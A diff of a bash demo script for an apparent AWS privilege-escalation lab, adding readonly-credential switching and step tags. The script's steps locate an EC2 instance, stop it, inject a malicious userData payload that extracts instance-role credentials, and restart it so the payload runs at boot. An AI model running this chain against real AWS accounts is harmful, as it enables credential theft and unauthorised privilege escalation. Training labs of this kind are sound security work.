@@ -72,20 +72,40 @@ if [ -z "$AWS_REGION" ]; then
     AWS_REGION="us-east-1"
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user and verify identity
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -100,15 +120,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -118,8 +140,9 @@ else
 fi
 echo ""
 
-# Step 5: Find the target EC2 instance
+# [EXPLOIT] Step 5: Find the target EC2 instance
 echo -e "${YELLOW}Step 5: Finding target EC2 instance${NC}"
+use_starting_creds
 show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --filters "Name=tag:Name,Values=$TARGET_INSTANCE_TAG" "Name=instance-state-name,Values=running,stopped" --query 'Reservations[0].Instances[0].InstanceId' --output text"
 INSTANCE_ID=$(aws ec2 describe-instances \
     --region $AWS_REGION \
@@ -145,9 +168,9 @@ INSTANCE_PROFILE=$(aws ec2 describe-instances \
 echo "Instance profile: $INSTANCE_PROFILE"
 echo -e "${GREEN}✓ Found target instance${NC}\n"
 
-# Step 6: Backup original user data
+# [EXPLOIT] Step 6: Backup original user data
 echo -e "${YELLOW}Step 6: Backing up original instance user data${NC}"
-
+use_starting_creds
 # Get the current user data (if any)
 show_cmd "Attacker" "aws ec2 describe-instance-attribute --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --attribute userData --query 'UserData.Value' --output text"
 ORIGINAL_USERDATA=$(aws ec2 describe-instance-attribute \
@@ -208,8 +231,9 @@ echo \"\$CREDS\" >> /var/log/credential-extraction.log
 
 echo -e "${GREEN}✓ Malicious payload created${NC}\n"
 
-# Step 8: Stop the EC2 instance
+# [EXPLOIT] Step 8: Stop the EC2 instance
 echo -e "${YELLOW}Step 8: Stopping the EC2 instance${NC}"
+use_starting_creds
 echo "Instance ID: $INSTANCE_ID"
 
 # Check current state
@@ -241,8 +265,9 @@ else
 fi
 echo ""
 
-# Step 9: Modify instance user data with malicious payload
+# [EXPLOIT] Step 9: Modify instance user data with malicious payload
 echo -e "${YELLOW}Step 9: Injecting malicious user data into instance${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - modifying userData to run on next boot..."
 
 # Base64 encode the malicious payload
@@ -262,8 +287,9 @@ aws ec2 modify-instance-attribute \
 
 echo -e "${GREEN}✓ User data modified successfully${NC}\n"
 
-# Step 10: Start the instance
+# [EXPLOIT] Step 10: Start the instance
 echo -e "${YELLOW}Step 10: Starting the instance to trigger malicious payload${NC}"
+use_starting_creds
 echo "The malicious user data will execute during boot..."
 
 show_attack_cmd "Attacker" "aws ec2 start-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --output text"
